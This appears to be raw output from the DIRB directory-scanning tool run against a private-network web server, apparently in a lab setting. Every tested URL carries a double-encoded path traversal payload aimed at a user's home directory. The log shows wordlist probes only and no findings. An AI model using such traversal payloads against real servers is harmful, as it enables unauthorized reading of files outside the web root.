
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Sat Jul  5 01:20:13 2025
URL_BASE: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
*** Generating Wordlist...
                                                                               
GENERATED WORDS: 4612
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fake
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/family
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fancybox
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/faq
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/FAQ
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/faqs
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fashion
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/favicon.ico
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/favorite
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/favorites
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fb
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fbook
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fc
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fcategory
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fcgi
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fcgi-bin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fck
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fckeditor
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/FCKeditor
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fdcp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/feature
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/featured
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/features
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fedora
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/feed
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/feedback
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/feedback_js
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/feeds
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/felix
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fetch
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fi
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/field
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fields
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/file
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fileadmin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/filelist
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/filemanager
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/files
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/filesystem
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fileupload
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fileuploads
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/filez
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/film
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/films
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/filter
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/finance
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/financial
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/find
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/finger
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/finishorder
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/firefox
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/firewall
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/firewalls
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/firmconnect
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/firms
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/firmware
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/first
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fixed
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fk
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fla
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flag
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flags
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flash
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flash-intro
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flex
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flights
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flow
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flowplayer
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flows
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flv
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flvideo
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/flyspray
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fm
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fn
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/focus
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/foia
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/folder
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/folder_new
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/folders
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/font
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fonts
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/foo
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/food
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/football
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/footer
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/footers
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/for
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forcedownload
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forget
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forgot
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forgot_password
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forgotpassword
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forgot-password
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forgotten
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/form
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/format
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/formatting
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/formhandler
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/formmail
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forms
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forms1
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/formsend
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/formslogin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/formupdate
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/foro
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/foros
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forrest
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fortune
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forum
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forum_old
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forum1
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forum2
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forumcp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forumdata
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forumdisplay
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forums
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/forward
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/foto
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fotos
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/foundation
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fpdb
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fpdf
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fr
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fr_FR
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/frame
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/frames
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/frameset
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/framework
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/francais
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/france
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/free
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/freebsd
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/freeware
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/french
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/friend
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/friends
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/frm_attach
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/frob
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/from
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/front
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/frontend
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/frontpage
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fs
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fsck
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/ftp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/fuck
                                                                                                                                                                                             
